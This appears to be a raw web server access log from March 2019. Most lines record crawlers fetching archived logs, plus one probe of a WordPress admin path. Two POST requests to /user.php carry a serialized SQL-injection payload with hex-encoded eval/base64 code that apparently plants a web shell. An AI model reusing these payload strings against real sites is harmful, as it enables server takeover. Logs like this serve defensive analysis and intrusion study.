123.125.71.60 - - [25/Mar/2019:02:17:36 -0700] "GET /self.logs/ HTTP/1.1" 200 15483 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.148.6 - - [25/Mar/2019:02:19:05 -0700] "GET /self.logs/2015/error.log.2015-03-26.gz HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.111 - - [25/Mar/2019:02:22:11 -0700] "GET /self.logs/access.log.2015-02-07.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
51.68.11.231 - - [25/Mar/2019:02:24:00 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
54.36.150.133 - - [25/Mar/2019:02:24:24 -0700] "GET /self.logs/2016/error.log.2016-05-22.gz HTTP/1.1" 200 663 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.7 - - [25/Mar/2019:02:26:32 -0700] "GET /self.logs/access.log.2015-04-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
5.255.250.94 - - [25/Mar/2019:02:26:33 -0700] "GET /self.logs/ HTTP/1.1" 200 15520 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
113.171.224.176 - - [25/Mar/2019:02:30:20 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
114.225.67.86 - - [25/Mar/2019:02:33:25 -0700] "POST /user.php HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
114.225.67.86 - - [25/Mar/2019:02:33:26 -0700] "POST /user.php HTTP/1.1" 404 239 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.148.197 - - [25/Mar/2019:02:33:33 -0700] "GET /self.logs/2015/error.log.2015-02-03.gz HTTP/1.1" 200 699 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
